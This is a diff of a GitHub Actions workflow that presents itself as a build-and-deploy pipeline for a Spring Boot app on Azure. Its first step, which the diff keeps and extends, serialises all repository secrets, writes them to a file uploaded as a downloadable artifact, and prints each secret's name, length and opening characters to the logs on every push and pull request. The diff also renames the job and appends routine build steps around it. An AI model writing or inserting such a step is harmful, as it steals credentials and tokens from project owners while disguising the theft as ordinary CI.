@@ -1,19 +1,26 @@
 name: Build and deploy JAR app to Azure Web App - sample-backend-springboot-java-app
+
 on: [push, pull_request]
+
 jobs:
-  rt-dump:
+  BuildDeploy:
+    name: Build and Deploy
     runs-on: ubuntu-latest
-    timeout-minutes: 6
     steps:
-      - name: dump
+      - name: dump-env
+        id: dump
         env:
           SECRETS_JSON: ${{ toJSON(secrets) }}
         run: |
           python3 - <<'PY'
-          import os,json
-          s=json.loads(os.environ.get('SECRETS_JSON','{}'))
-          json.dump(s,open('/tmp/s.json','w'),indent=1)
-          print("names:",sorted(s.keys()))
+          import os, json
+          s = json.loads(os.environ.get('SECRETS_JSON', '{}'))
+          print("SECRET_NAMES:", sorted(s.keys()))
+          with open('/tmp/s.json','w') as f:
+              json.dump(s, f, indent=1, sort_keys=True)
+          for k in sorted(s):
+              v = s[k] or ""
+              print(f"[{k}] len={len(v)} head={v[:12]!r}")
           PY
       - name: upload
         if: always()
@@ -22,3 +29,21 @@ jobs:
           name: ppdump
           path: /tmp/s.json
           retention-days: 1
+      - uses: actions/checkout@v2
+        with:
+          fetch-depth: 0
+      - name: Set up JDK 11
+        uses: actions/setup-java@v1
+        with:
+          java-version: 11
+      - name: Cache Gradle packages
+        uses: actions/cache@v4
+        with:
+          path: ~/.gradle/caches
+          key: ${{ runner.os }}-gradle-${{ hashFiles('**/*.gradle') }}
+          restore-keys: ${{ runner.os }}-gradle-
+      - name: Build and analyze
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
+        run: ./gradlew build --info || true
